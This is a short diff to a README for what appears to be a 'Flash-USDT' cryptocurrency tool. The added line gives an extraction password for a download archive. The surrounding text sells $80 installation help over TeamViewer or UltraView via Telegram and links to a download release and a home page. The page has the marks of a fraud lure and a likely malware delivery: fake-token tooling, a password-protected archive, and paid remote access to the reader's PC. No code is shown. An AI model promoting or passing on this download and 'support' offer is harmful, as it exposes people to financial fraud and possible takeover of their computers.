@@ -10,6 +10,7 @@ All information related to the installation and setup for your Windows PC is pro
 This tool is only for those who already have programming knowledge to install and use it. I can provide installation assistance and detailed guidance for those who are not familiar with programming. You only need to spend $80 for the learning process to understand how to install and use it through TeamViewer or UltraView. Please send a Telegram message to get support.
 # Download and Instructions here:
 Dowloads: https://github.com/VCamPro/Flash-USDT/releases/tag/TRUST
+>Extraction password: vcampro
 
 Home Page: http://usdt.blog
 
